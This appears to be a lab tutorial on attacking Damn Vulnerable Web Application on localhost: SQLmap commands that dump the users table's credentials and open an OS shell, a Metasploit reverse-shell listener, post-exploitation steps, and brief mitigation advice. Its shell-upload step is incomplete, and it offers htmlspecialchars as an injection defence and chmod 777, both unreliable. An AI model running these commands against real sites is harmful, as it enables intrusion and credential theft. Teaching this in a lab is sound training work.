## **Exploiting SQL Injection on DVWA Using SQLmap and Metasploit**  

In this guide, we’ll exploit **Damn Vulnerable Web Application (DVWA)** using **SQLmap** to find an SQL Injection vulnerability and then use **Metasploit** to gain a reverse shell.  

---

## **1. Setting Up the DVWA Environment**  
### **1.1 Install DVWA on Kali Linux**  
If you don’t already have DVWA installed, set it up using:  

```bash
sudo apt update
sudo apt install apache2 mariadb-server php php-mysqli php-gd libapache2-mod-php
```

Download and set up DVWA:  
```bash
git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
sudo chmod -R 777 /var/www/html/dvwa
sudo chown -R www-data:www-data /var/www/html/dvwa
sudo systemctl restart apache2 mariadb
```

### **1.2 Configure DVWA**  
1. Navigate to `http://localhost/dvwa/setup.php`.  
2. Click **“Create / Reset Database”**.  
3. Log in with **admin/password**.  
4. Set **DVWA Security Level to Low** (Go to `DVWA Security` settings).  

---

## **2. Exploiting SQL Injection with SQLmap**  
Once DVWA is running, find a vulnerable parameter.

### **2.1 Identify a Vulnerable Endpoint**  
Go to `http://localhost/dvwa/vulnerabilities/sqli/` and enter:  
```sql
' OR 1=1 --
```
If the response changes, the parameter is vulnerable.

### **2.2 Use SQLmap to Exploit the Vulnerability**  
Run SQLmap to detect SQL injection on DVWA:  
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxxxx; security=low" --dbs
```
Replace `PHPSESSID=xxxxx` with your session ID from the browser (Inspect > Storage > Cookies).  

This command:  
✅ Identifies databases in MySQL  

### **2.3 Extract Tables and Columns**  
Find tables in `dvwa` database:  
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxxxx; security=low" -D dvwa --tables
```
Find columns in the `users` table:  
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxxxx; security=low" -D dvwa -T users --columns
```

### **2.4 Dump User Credentials**  
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxxxx; security=low" -D dvwa -T users --dump
```
✅ This extracts **usernames and hashed passwords**.

---

## **3. Gaining Shell Access via Metasploit**  
We will now escalate the attack using **Metasploit**.

### **3.1 Check if Command Execution is Possible**  
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxxxx; security=low" --os-shell
```
If successful, you’ll get an interactive shell.

### **3.2 Inject a Metasploit Reverse Shell**  
1. Open Metasploit:  
   ```bash
   msfconsole
   ```

2. Set up a listener:  
   ```bash
   use exploit/multi/handler
   set payload php/meterpreter/reverse_tcp
   set LHOST <your Kali IP>
   set LPORT 4444
   exploit
   ```

3. Inject a PHP reverse shell using SQLmap:  
   ```bash
   sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxxxx; security=low" --file-write=/var/www/html/dvwa/shell.php --file-dest=/var/www/html/dvwa/shell.php
   ```

4. Execute the shell:  
   ```
   curl http://localhost/dvwa/shell.php
   ```
   Now check your Metasploit listener—**you should have a meterpreter session**.  

---

## **4. Post-Exploitation**
Once inside, you can:  
✅ **Dump database contents**  
✅ **Escalate privileges**  
✅ **Download sensitive files**  

Try:  
```bash
meterpreter> sysinfo
meterpreter> shell
```

---

## **5. Mitigation & Defense**  
To prevent SQL Injection:  
✅ Use **Prepared Statements**  
✅ **Sanitize Input** (`htmlspecialchars()`, `mysqli_real_escape_string()`)  
✅ **Limit Database Privileges**  
✅ Use a **Web Application Firewall (WAF)**  
